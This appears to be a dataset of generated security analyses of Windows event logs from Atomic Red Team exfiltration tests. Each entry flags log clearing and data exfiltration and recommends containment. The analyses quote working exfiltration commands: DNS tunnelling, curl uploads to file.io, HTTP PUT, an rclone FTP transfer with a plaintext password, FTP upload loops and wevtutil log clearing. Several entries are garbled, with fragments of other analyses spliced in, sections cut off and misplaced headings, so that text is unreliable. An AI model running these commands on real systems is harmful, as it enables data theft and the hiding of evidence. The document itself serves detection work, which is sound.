DNSExfiltration (doh),"### Analysis of Windows Event Logs

#### Anomalous Behaviors:

1. **PowerShell Execution:**
   - A process `powershell.exe` was executed with a suspicious command line utilizing the tool `Invoke-DNSExfiltrator`, which can be used for data exfiltration over DNS.
   - Command Included:
     ```
     ""powershell.exe"" & {Import-Module ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\dnsexfil.ps1"", Invoke-DNSExfiltrator -i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\dnsexfil.ps1"" -d target.example.com -p atomic -doh google -t 500}
     ```
   - This command is highly indicative of a potential malicious activity aimed at data exfiltration.

2. **Event Log Clearing:**
   - Event logs such as Security logs were cleared:
     - EventID `1102` indicates that the security log was cleared by the user `SERVER002\\admin_test`.
   - This kind of event log clearing is often considered suspicious as it can be an attempt to cover tracks.

3. **Execution of Too Many Instances of `wevtutil.exe`:**
   - Multiple executions of `wevtutil.exe` were observed, which provides commands to manage event logs.
   - The command executed:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" cl <LOG_NAME>
     ```
   - The clearing of logs could be indicative of an attempt to obfuscate malicious actions.

4. **Invocation of `whoami` and `hostname`:**
   - Though benign in isolation, when combined with other findings, usage patterns of `whoami` to find currently executing user and `hostname` can raise suspicions, especially after DNS exfiltration commands.

#### Indicators of Malicious Activity:

- **PowerShell Command with External Modules:**
  - The presence of `dnsexfil.ps1` scripts suggests usage of a penetration testing or hacking toolkit for data exfiltration.

- **Frequent `wevtutil.exe` Executions:**
  - Used potentially in coordination with command line clearing, suggestive of covering malicious activity in the system.

- **Log Clearing Events:**
  - Security (with EventID 1102) and other event logs cleared indicating potential malicious intent to erase traces.

#### Threat Assessment and Recommendations:

- **Threats Identified:**
  - High potential for data exfiltration using PowerShell and DNS tunneling methodology.
  - Clear intent to conceal system activity by clearing event logs.

- **Recommendations:**
  - Immediate isolation of the affected machine `Server002` for full forensic investigation.
  - Conduct a comprehensive security assessment and review username `SERVER002\admin_test` access.
  - Examine network logs to identify any unusual traffic patterns, especially any communications with `target.example.com`.
  - Verify integrity and contents of the file `dnsexfil.ps1`.
  - Advised to reset passwords for user accounts with suspicious activity.

Exfiltration Over Alternative Protocol - HTTP,"Based on the provided Windows event logs, several suspicious activities have been identified. Here's a detailed analysis:

### Suspicious Activities:

1. **Event Log Clearing**:
   - **Security Event ID 1102**: This event indicates that the security log was cleared. The user involved is ""admin_test"".
   - **System Event ID 104**: Logs from the System and Windows PowerShell channels were also cleared by the same user ""admin_test"".

   Clearing of event logs, especially the security log, is a direct indication of an attempt to cover tracks, which is highly suspicious.

2. **Process Execution**:
   - **Sysmon Event ID 1**: Multiple instances of `wevtutil.exe` were used with the `cl` (clear) command against several event logs (Security, System, Application, and Windows PowerShell). This is consistent with the clearing of logs observed in the logs clearing events and reinforces the suspicion of activity designed to hide traces.

3. **Privilege Escalation**:
   - **Security Event ID 4672**: The user ""admin_test"" was granted special privileges multiple times, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These are powerful privileges that can be exploited for unauthorized access or escalation within the system.

4. **Suspicious PowerShell Activity**:
   - **PowerShell Logs**: A PowerShell script was executed with a command to read the contents of `notepad.exe` and post it to `http://127.0.0.1` using `Invoke-WebRequest`. This is abnormal behavior and possibly indicative of an attempt to exfiltrate data or test the ability to exfiltrate data without leaving the network.

5. **Time Manipulation**:
   - Multiple events indicate time discrepancies and manipulations (Kernel-General Event ID 1), possibly used to make event correlations more difficult or manipulate logs indicating compromises.

### Assessment:

Based on the above indicators, there is strong evidence to suggest that malicious activity has taken place. The clearing of event logs, especially in conjunction with suspicious PowerShell usage that attempts to perform operations with potential data exfiltration activities, coupled with privilege escalation attempts, creates a compelling case for malicious activity.

### Resolution: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Containment**:
   - Isolate the host ""Server002"" from the network to prevent any further potential malicious activity and data exfiltration.
   - Notify relevant security personnel and stakeholders about the identified threat for awareness and response planning.

2. **Investigation and Forensics**:
   - Collect and preserve all relevant digital evidence for further analysis, focusing on tracing the origin of the compromise and understanding the attack vector.
   - Review user activities, particularly those involving the ""admin_test"" account for unauthorized access or usage.

3. **Review and Strengthen Security Policies**:
   - Implement monitoring for similar activities across the network.
   - Enforce stricter access controls and review the necessity of privileged permissions such as those observed in this incident.

4. **Remediation and Hardening**:
   - Clean or rebuild the affected systems to ensure no residual or active threats are present.
   - Apply security patches and harden the system's defenses to prevent future exploitation attempts.

5. **User Training and Awareness**:
   - Educate users about the risks associated with their roles and the importance of maintaining security best practices to avoid account misuse.

By following these recommendations, the company can better understand the breach, mitigate its effects, and bolster defenses against future attempts."
Exfiltration Over Alternative Protocol - ICMP,"The provided event logs indicate several activities, some of which suggest potential malicious behavior that should be investigated further. Here is a detailed analysis of the logs:

1. **Log Cleared Events**:
   - System Event ID 104 shows that the event logs for the System, Windows PowerShell, and Security channels were cleared by the user `admin_test` on the computer `Server002`.
   - The use of `wevtutil` command line tool (`wevtutil.exe cl`) to clear the logs is evident in the Sysmon logs (Event ID 1). This is a significant indication of potential malicious activity, as clearing event logs is commonly associated with attempts to cover tracks.

2. **Time Change Events**:
   - Security Event IDs 4616 indicate that the system time was changed by a process running as `LOCAL SERVICE`. Time changes can be a tactic used for anti-forensics, time-stomping, or to align timestamps with other malicious activities.

3. **Suspicious PowerShell Activity**:
   - A suspicious PowerShell script execution is logged in both the Sysmon and PowerShell logs. The command includes reading bytes from `notepad.exe` and sending them via ping (`$ping.Send(""127.0.0.1"", 1500, $Data)`), which is a highly unusual and potentially malicious operation indicating data exfiltration or covert communication.

4. **Scheduled Software Update**:
   - There are several logs related to Microsoft Edge updates, which appear legitimate (including the running of EdgeUpdate.exe and related installations). These appear to be routine system updates and don't directly relate to malicious activity, but in conjunction with log clearing, it should be distinguished clearly.

5. **General Observations**:
   - The centralized time of these events at 15:39:16 indicates a possibly orchestrated sequence of actions, potentially automated or manually triggered by an unauthorized user.

**Assessment**:
- The log clearing operations using `wevtutil.exe` and suspicious PowerShell activity strongly indicate potential malicious behavior. These actions appear intended to obscure evidence of other activity, such as the execution of potentially malicious scripts.

**Resolution**: MALICIOUS
- The actions observed are consistent with typical behaviors employed during system compromises, such as log clearing and suspicious script execution, suggesting intent to conduct or hide unauthorized operations.

**Guidance**:
- Immediately review access logs to determine how `admin_test` credentials were used or compromised.
- Inspect other systems for similar activities as this could be part of a broader attack.
- Enhance monitoring of PowerShell command execution and restrict use of `wevtutil` by stricter role-based access control.
- Conduct a thorough investigation into any other potential unauthorized access or changes on the affected system, and consider isolating the system until a detailed forensic examination is completed."
C2 Data Exfiltration,"Here is a detailed analysis of the provided log entries:

### Suspicious Activity Summary:

1. **Event Log Clearing**:
   - Multiple Event ID 104 logs indicate that the Windows Event Logs have been cleared. This is typically a sign of suspicious activity as it suggests an attempt to cover tracks after potentially malicious actions.
   - Logged by user ""admin_test"" through the `wevtutil.exe` command, targeting multiple log channels: System, Security, and Windows PowerShell.

2. **Time Changes**:
   - Several  Events show that the system time was backdated (Event ID 4616). This could indicate an effort to confuse time logs, another technique used to obfuscate logs of malicious activity.

3. **PowerShell Activity**:
   - A PowerShell script was run with potential data exfiltration behavior. The script involved manipulating files and using `Invoke-WebRequest` to send data to a remote URI (example.com). While ""example.com"" is generally a placeholder, this action mirrors techniques used for data exfiltration.

4. **Privilege Escalation**:
   - Event ID 4672 logs indicate that the account ""admin_test"" was granted special privileges, such as `SeDebugPrivilege` and others, which can be leveraged to perform attacks with elevated permissions.

5. **Sysmon Logs and Process Monitoring**:
   - The `wevtutil.exe` usage combined with the process derivatives suggests an explicit action to clear event logs (commands seen clearing logs Programmatically).
   - The use of powerful administrative tools like `whoami.exe` and `hostname.exe` by an admin account within a small timeframe adds to the profile of potential breach or scripting of sequences.

### Assessment:

Based on the analysis of the logs, the activities noted display characteristics typically associated with malicious actions. This is due to the combination of log clearing, suspicious PowerShell commands (net/web requests), and privilege escalations. 

### Resolution:
- **MALICIOUS** - I assess these logs as indicative of malicious activity. The clearing of logs, coupled with other suspicious behavior inclusive of PowerShell script execution related to potential data exfiltration, strongly suggests attempts to compromise and cover tracks.

       ""cmd.exe"" /c C:\\Windows\\System32\\Curl.exe -k -F ""file=@C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam/T1048.002/src/artifact"" https://file.io/
       ```
     - This activity is highly suspicious as it involves external communication over an encrypted channel using `curl` under the context of a possibly benign process, `cmd.exe`.

4. **Miscellaneous Processes:**
   - Several legitimate processes such as `conhost.exe` and `whoami.exe` were executed but appear to follow from the suspicious parent processes (`wevtutil.exe` and `cmd.exe`), consistent with process masquerading or parent-child process relationships from suspicious commands.

#### Assessment and Conclusion:
Based on the pattern of cleared logs, the use of utilities to upload files externally, and command-line executions typical of data exfiltration or log manipulation (common attacker TTPs):

- **Resolution:** **MALICIOUS**
  
This set of logs provides strong indicators of a compromised host, with the user `admin_test` performing actions consistent with an intrusion. There is a high likelihood of data exfiltration activities.

### Recommendations:

1. **Clearing of Event Logs**:
   - Event ID 1102 indicates that the security log was cleared by the user `admin_test`. Clearing event logs is a known tactic used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - A PowerShell command was executed with the following command line: 
     ```
     powershell.exe & {$fileName = ""C:\temp\T1020_exfilFile.txt""; $url = ""https://google.com""; $file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""; $contentType = ""application/octet-stream""; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}}
     ```
   - This command creates a file and attempts to upload it to a URL, mimicking data exfiltration behavior. The mention of ""IcedID Botnet"" and an attempt to perform an HTTP PUT request to upload potentially sensitive data is highly suspicious.

3. **Use of High-Privilege Account**:
   - The user `admin_test` was observed with several high-privilege assignments such as SeDebugPrivilege, SeTakeOwnershipPrivilege, etc., which are often targeted by attackers to maintain persistence and perform privileged operations on the system.

4. **Repeated Logon Events**:
   - Multiple logon events (Event IDs 4624, 4634) associated with the account `admin_test` may suggest unauthorized access, particularly when combined with other suspicious activities.

5. **Svchost and Other System Executables**:
   - While some system processes like `wuauclt.exe`, `taskhostw.exe`, and `svchost.exe` appeared in the logs performing legitimate operations like updates, the timing coincides with the time when log cleaning and suspicious PowerShell activity occurred.

6. **Host Commands**:
   - Commands like `hostname.exe` and `whoami.exe` are executed typically to gather information about the network environment and user context. While these aren't inherently malicious, when executed alongside the above suspicious activities, they could represent reconnaissance.

### Assessment:
The logs reveal sequences of activities that include log clearing, high-privilege assignments, suspicious PowerShell scripts, and possible data exfiltration attempts. Collectively, these suggest that the system may have been compromised with an intent to exfiltrate data.

### Resolution:
**MALICIOUS** - The presence of logs clearing, PowerShell commands indicative of data exfiltration, and high privilege escalations strongly suggest malicious activity.

### Guidance on How to Proceed:
- Immediately isolate the compromised host from the network to prevent further data exfiltration.
- Conduct a forensic investigation to determine the full scope of the compromise.
- Reset credentials for any potentially compromised user accounts and review privileged access assignments.
- Review firewall and network logs to identify any communication with known malicious IPs/domains.
- Implement additional security measures such as enhanced monitoring and potentially whitelisting legitimate PowerShell scripts to prevent such abuse in the future."
Exfiltration via Encrypted FTP,"### Analysis of the Logs

Based on the logs provided, there are several indicators of potentially suspicious or malicious activity:

1. **Clearing Logs**: 
   - Security log entry `EventID: 1102` and System log entries `EventID: 104` indicate log clearing activity. The logs show that the user `admin_test` cleared the security, system, and PowerShell event logs. Clearing of logs is often associated with attempts to cover tracks following unauthorized or suspicious activities.

2. **Time Change Event**:
   - Security events with `EventID: 4616` suggest that the system time was reset. This can indicate an attempt to alter forensic evidence or evade detection time-based monitoring systems.

3. **Suspicious PowerShell Activity**:
   - The Sysmon logs show process execution of `WindowsPowerShell` with a command line that includes FTP data exfiltration logic, confirmed by logs at `Sysmon` and `Windows PowerShell` events. The script attempts to send a file ""T1020__FTP_sample.txt"" to an external FTP server. This is highly indicative of data exfiltration attempts.

4. **Unusual Privilege Events**:
   - There are multiple logons and privilege events for the user `admin_test`, showing access to sensitive privileges such as `SeDebugPrivilege`, which are typically not needed for regular user operations and are often associated with privilege escalation attempts.

5. **Use of `wevtutil.exe`**:
   - Multiple executions of `wevtutil.exe` to clear different logs caught by Sysmon. This aligns with the activity to cover tracks after potentially malicious activities.

### Assessment

The described activities provide strong evidence of malicious actions, including:
- Attempts to erase audit trails by clearing event logs, which is a significant red flag.
- Evidence of potential data exfiltration using PowerShell, trying to push data to an external FTP server.

Exfiltration Over Alternative Protocol - FTP - Rclone,"**Detailed Analysis of the Event Logs**

**1. Suspicious or Anomalous Behavior:**

- **PowerShell Usage:** The usage of PowerShell with a highly specific and complex command line is a common vector for executing malicious scripts. In this instance, the command executed via PowerShell is indicative of potentially malicious activity. The command involves:
  - Enumerating files with specific names: ""rclone.exe"" and ""exfil.zip"" within the directory ""C:\Users\Public\Downloads\"" using `Get-ChildItem`.
  - Configuration of an FTP connection to ""ftp.dlptest.com"" with user ""dlpuser"" and password ""rNrKYTX9g7z3RgJRmxWuGHbeu"".
  - Using `rclone` to copy a file (potentially ""exfil.zip"") to the configured FTP server. This action strongly suggests data exfiltration.

- **Rclone Executable:** The presence of ""rclone.exe"" and its execution is suspicious as it is a known tool for cloud storage synchronization but can also be used for data exfiltration.

- **System Logs Cleared:** Event logs for several channels, including System and Security, have been cleared by the user ""admin_test"". Log clearing is often done by attackers to cover tracks.

- **High Integrity Level Execution:** Multiple processes including PowerShell, and rclone, were executed with high integrity levels by the user account ""admin_test"". This implies privilege levels that are generally unnecessary for typical operations, raising suspicion.

- **WhoAmI and Hostname Executions:** These commands could be part of adversary reconnaissance to gather system and user information.

**2. Indicators of Malicious Activity:**

- **Data Exfiltration Attempt:** The PowerShell script that configures an FTP server and executes an `rclone` command to transfer files suggests an intentional data exfiltration attempt.
- **Credential Access Attempts:** Repeated ""MicrosoftAccount"" credential access events (EventID: 5379) indicate attempts to enumerate or access stored credentials; return codes indicate failure, suggesting some form of unauthorized access attempt.
- **Log Clearing Activity:** The action to clear multiple logs aligns closely with known post-exploitation strategies.

**Assessment**

The logs exhibit clear signs of malicious activity indicating a potential compromise. The execution of a complex PowerShell script to exfiltrate data using an FTP server, coupled with the presence of ""rclone.exe"" and subsequent log clearing to obfuscate actions, are strong indicators of malicious intent and execution.

   - Review and harden the security measures on the CEO’s and other high-value targets within the organization to prevent further incidents, including implementing stricter access controls and monitoring.

4. **Incident Response and Reporting:**
   - Follow the incident response protocol, document findings, and report to relevant stakeholders, ensuring that all logs and findings are preserved for potential legal actions or law enforcement investigations."
Text Based Data Exfiltration using DNS subdomains,"Based on the provided Windows event logs, I have conducted a detailed analysis to identify any indicators of malicious activity. Here's a summary and analysis of the findings:

1. **Suspected Malicious PowerShell Activity:**
   - The PowerShell log entries indicate a command execution involving PowerShell script that is attempting to exfiltrate data via DNS queries. The script includes:
     ```shell
     powershell.exe & {$dnsServer = ""dns.example.com""
     $exfiltratedData = ""SecretDataToExfiltrate""
     ...
     foreach ($chunk in $chunks) {
       $dnsQuery = $chunk + ""."" + $dnsServer
       Resolve-DnsName -Name $dnsQuery
       Start-Sleep -Seconds 5
     }}
     ```
   - This script is likely malicious as it encodes data to Base64 and tries to exfiltrate it to an external DNS server (`dns.example.com`) by breaking it into chunks and sending these as DNS queries. This is a classic DNS tunneling technique used for data exfiltration.

2. **Clearing of Event Logs:**
   - The Sysmon logs show multiple executions of `wevtutil.exe cl` for clearing the event logs (""Application"", ""System"", ""Security"", ""Windows PowerShell""). This action is suspicious as it may have been done to cover tracks.
   - Associated with the `admin_test` user, who has high integrity level executions, indicating possible misuse of admin privileges.

3. **Temporal Context and Anomalies:**
   - The sequence of events is tightly grouped and follows a suspicious pattern of executing utility commands paired with PowerShell script execution and log clearing—indicative of someone trying to operate stealthily after performing potentially malicious actions.

4. **Indicators of Compromise (IoC):**
   - Utilization of `wevtutil.exe` to clear logs is particularly suspicious in the context of subsequent PowerShell invocations.
   - The PowerShell script commands and the DNS tunneling method used signify an attempt at covert communication for data exfiltration.

**Assessment:**
- The sequence of events recorded in the logs strongly indicates malicious behavior. The PowerShell script's attempt to exfiltrate data using DNS queries is a significant red flag, along with the clearing of various event logs on the system.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Isolate the Affected System:** Immediately isolate `Server002` from the network to prevent further data exfiltration and to contain any potential spread of the incident.
2. **Conduct a Full Forensic Analysis:** Further investigate the `Server002` system to track any other suspicious activities and analyze any additional unauthorized access or modifications.
3. **Review Security Protocols:** Ensure that all logs are being adequately backed up and access logs for `admin_test` are reviewed for other suspicious activities.
4. **Monitor Network Traffic:** Enhance monitoring of outgoing DNS queries from other systems within the network for similar activities.
5. **Inform Security Teams and Stakeholders:** Notify your cybersecurity team and potentially affected stakeholders, including IT support and the legal department, to prepare for any further implications.

These actions help ensure that the current incident is contained and that similar attacks are mitigated or prevented in the future."
MAZE FTP Upload,"### Detailed Analysis of the Logs:

#### Indicators of Malicious Activity:
1. **Unusual PowerShell Usage:**
   - The logs demonstrate an instance of PowerShell being initiated to upload files with a script that involves FTP communications. The PowerShell script essentially checks for connectivity to an FTP server at `127.0.0.1` and attempts to upload files with a "".7z"" extension from a directory.
   - Command in question:
     ```powershell
     powershell.exe & {$Dir_to_copy = \""$env:windir\\temp\\\"", $ftp = \""ftp://127.0.0.1/\"", $web_client = New-Object System.Net.WebClient, $web_client.Credentials = New-Object System.Net.NetworkCredential('', ''), if (test-connection -count 1 -computername \""127.0.0.1\"" -quiet), {foreach($file in (dir $Dir_to_copy \""*.7z\"")), {echo \""Uploading $file...\"", $uri = New-Object System.Uri($ftp+$file.name), $web_client.UploadFile($uri, $file.FullName)}}, else, {echo \""FTP Server Unreachable. Please verify the server address in input args and try again.\""}}
     ```
   - This behavior is highly suspicious and indicative of data exfiltration efforts or attempts at data theft.

2. **Event Log Clearing:**
   - Multiple instances of certain logs such as System, Windows PowerShell, and Security logs being cleared by the user `admin_test` via the process `wevtutil.exe`.
   - Event IDs 104 in the System log and 1102 in the Security log indicate these actions.
   - The clearing of logs is a common post-compromise activity to cover tracks and ensure actions go undetected.

3. **Time Manipulation:**
   - The logs show evidence of time being set back, which is represented by Event ID 4616 in the Security log.
   - Time manipulation is often used to evade detection mechanisms or to match file and log times for processes executed under the radar.

#### Risks and Threats Identified:
- **Data Exfiltration:** The PowerShell activity is indicative of an attempted data exfiltration using a basic but effective script to upload sensitive files.
- **Operational Evasion:** Clearing of logs and time manipulation points to deliberate attempts at masking actions, which are consistent with sophisticated threat actor behaviors to avoid detection.

#### Guidance on How to Proceed:
- **Isolate the Host:** Immediately isolate the CEO's machine from the network to prevent any further potential data exfiltration.
- **Conduct a Detailed Forensic Analysis:** Engage a digital forensics team to deeply analyze the filesystem and memory of the compromised host for any further signs of malicious artifacts or leftover scripts.
- **Audit Other Systems:** Expand the investigation to see if similar activities are observed in logs from other high-value or critical machines within the network.
- **Review FTP Logs:** Check network and firewall logs to determine if there were any additional outbound FTP attempts.
- **Update Security Protocols:** Enhance security training and awareness, specifically around detecting and reporting anomalous use of administrative tools and unusual network or PowerShell activity.

### Resolution:
- **MALICIOUS:** The combination of PowerShell scripting indicating attempted data exfiltration, log clearing actions, and time manipulation strongly point to malicious activity with intent to steal or corrupt data and evade detection systems. Immediate action is warranted to mitigate potential impacts."
Network-Based Data Transfer in Small Chunks,"**Log Analysis:**

1. **Clearing of Event Logs:**
   - The system log contains multiple events (Event ID 104) indicating the clearing of log files (System, Windows PowerShell) by the user ""admin_test"". This is often done to cover tracks of malicious activities.
   - The security log also has an Event ID 1102 indicating that the security log was cleared by ""admin_test"".

2. **Suspicious PowerShell Activity:**
   - The Sysmon log shows a PowerShell process with a suspicious command line executed by ""admin_test"". The command reads a file and sends its contents as Base64 encoded chunks to an external URI (http://example.com) using `Invoke-WebRequest`. This indicates possible data exfiltration.

3. **Execution of Utilities:**
   - Multiple executions of `wevtutil.exe` are observed, which is used to clear event logs (`wevtutil.exe cl Application`, `System`, and `Windows PowerShell`). Clearing logs is a known malicious activity used to hide evidence.
   - Additionally, other utilities such as `whoami.exe` and `hostname.exe` were executed, indicating possible reconnaissance activities.

4. **Events Showing Normal Update Activities:**
   - The logs from the Windows Update Client and Software Distribution processes (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) show normal system update operations.

5. **Windows Defender Status:**
   - The Application log indicates that Windows Defender is active with the ""SECURITY_PRODUCT_STATE_ON"" status, showing no indication of being disabled.

**Assessment:**
Based on the analysis, several events indicate suspicious behavior:
- Clearing of multiple event logs by an admin account without a clear reason.
- Execution of PowerShell scripts potentially used for data exfiltration.
- Use of system utility `wevtutil.exe` to clear logs, which is a common step in malicious activity to erase evidence.

**Resolution:**
- **MALICIOUS**: The actions of clearing logs, coupled with the suspicious PowerShell command indicating potential data exfiltration, strongly indicate malicious activity. Immediate incident response is recommended!

**Guidance on How to Proceed:**
- Conduct a full forensic analysis of the system, including memory forensics.
- Check network logs for outbound connections to the mentioned external URI.
- Identify the file being exfiltrated, and check if any sensitive data has been compromised.
- Reset the credentials for ""admin_test"" and any other potentially compromised accounts.
- Ensure EDR and antivirus tools are updated and consider isolating the affected host from the network during the investigation."
